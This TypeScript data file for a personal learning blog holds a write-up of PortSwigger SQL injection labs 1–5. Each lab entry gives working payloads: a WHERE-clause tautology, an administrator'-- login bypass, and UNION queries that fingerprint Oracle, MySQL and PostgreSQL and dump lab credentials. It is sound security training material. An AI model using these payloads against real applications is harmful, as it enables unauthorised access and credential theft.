export interface DiaryLab {
  title: string
  notes: string[]
  solution: string
}

export interface DiaryEntry {
  id: string
  /** ISO date string, e.g. '2026-07-28'. Used for sorting. */
  date: string
  category: string
  title: string
  /** What you actually did that day. */
  workedOn: string[]
  /** Intro or reflection before lab breakdown. */
  body: string[]
  /** Per-lab write-ups with solutions. */
  labs?: DiaryLab[]
  tools?: string[]
  tags?: string[]
  link?: { label: string; url: string }
}

/**
 * Add new posts at the top of this array (newest first).
 * Keep dates as YYYY-MM-DD so sorting stays correct.
 */
export const cyberDiaryEntries: DiaryEntry[] = [
  {
    id: 'portswigger-sqli-labs-1-5',
    date: '2026-07-28',
    category: 'PortSwigger Labs',
    title: 'SQL Injection labs 1-5 (Burp Suite)',
    workedOn: [
      'Completed labs 1–5 on the PortSwigger SQL injection path',
      'Used Burp Proxy to intercept traffic and Repeater to send payloads',
      'Worked through WHERE clause bypass, login bypass, UNION attacks on Oracle/MySQL/PostgreSQL, and dumping credentials',
    ],
    body: [
      'First proper session on the Web Security Academy SQL injection module. Burp Repeater was the main tool once I had a request captured from Proxy.',
      'Main takeaway: comment syntax and version functions change per database (-- vs #, v$version vs @@version vs version()). Getting the column count with ORDER BY and confirming text columns with UNION SELECT came up in almost every lab.',
    ],
    labs: [
      {
        title:
          'Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data',
        notes: [
          'Vulnerable parameter is the category filter on the product listing page.',
          'Appending a tautology to the WHERE clause returns all rows, including hidden ones.',
        ],
        solution: "GET /filter?category=Gifts' OR '1'='1",
      },
      {
        title: 'Lab 2: SQL injection vulnerability allowing login bypass',
        notes: [
          "Adding a single quote (') caused the page to fail, confirming the input is passed into a SQL query.",
          'Goal was to log in as administrator. Testing username admin with a quote did not work.',
          "The login query looks like: SELECT firstname FROM users WHERE username='...' AND password='...'",
          "Using a comment to skip the password check: administrator'-- with any password value.",
        ],
        solution: "Username: administrator'--  |  Password: (anything)",
      },
      {
        title:
          'Lab 3: SQL injection attack, querying the database type and version on Oracle',
        notes: [
          'Intercepted the category filter request in Burp Proxy and sent it to Repeater.',
          "category=Gifts' ORDER BY 1-- → 200",
          "category=Gifts' ORDER BY 2-- → 200",
          "category=Gifts' ORDER BY 3-- → 500, so 2 columns confirmed.",
          "category=Gifts' UNION SELECT 'a', 'a' FROM DUAL-- → 200. FROM DUAL confirms Oracle.",
        ],
        solution: "' UNION SELECT banner, NULL FROM v$version--",
      },
      {
        title:
          'Lab 4: SQL injection attack, querying database type and version on MySQL and Microsoft',
        notes: [
          'Intercept via Burp, send to Repeater.',
          "category=Accessories' ORDER BY 1-- → 500. Comment syntax -- did not work here.",
          "category=Accessories' ORDER BY 1# → 200. # works as the comment character on this database.",
          "ORDER BY 2# → 200, ORDER BY 3# → 500. Two columns again.",
          'Both columns display text on the page.',
          "category=Accessories' UNION SELECT 'a', 'a'# → 200.",
          'Not Oracle (no FROM DUAL needed). Microsoft/SQL Server uses @@version.',
        ],
        solution: "' UNION SELECT @@version, NULL#",
      },
      {
        title:
          'Lab 5: SQL injection attack, listing the database contents on non-Oracle databases',
        notes: [
          'Intercept and Repeater again on the category filter.',
          "ORDER BY 1-- and ORDER BY 2-- → 200. ORDER BY 3-- → 500. Two columns.",
          "UNION SELECT 'a', 'a'-- → 200. Both columns hold text.",
          "@@version → 500, so not Microsoft SQL Server.",
          "version() → 200, so PostgreSQL.",
          "UNION SELECT table_name, NULL FROM information_schema.tables-- → 200. Found table: users_ocetwc.",
          'First attempt at column lookup returned 500 because I wrote information.schema instead of information_schema.',
          "UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_ocetwc'-- → username_oslrwn and password_epjcib.",
          'Dumped credentials and logged in as administrator successfully.',
          'Remember the trailing -- on payloads; forgetting it caused a 500 more than once.',
        ],
        solution:
          "' UNION SELECT username_oslrwn, password_epjcib FROM users_ocetwc--\n\nCredentials found:\nadministrator\no0cg3skime8olq3u1au0",
      },
    ],
    tools: ['Burp Suite', 'Burp Proxy', 'Burp Repeater'],
    tags: [
      'SQL injection',
      'UNION attacks',
      'Oracle',
      'PostgreSQL',
      'login bypass',
    ],
    link: {
      label: 'SQL injection labs',
      url: 'https://portswigger.net/web-security/sql-injection',
    },
  },
]
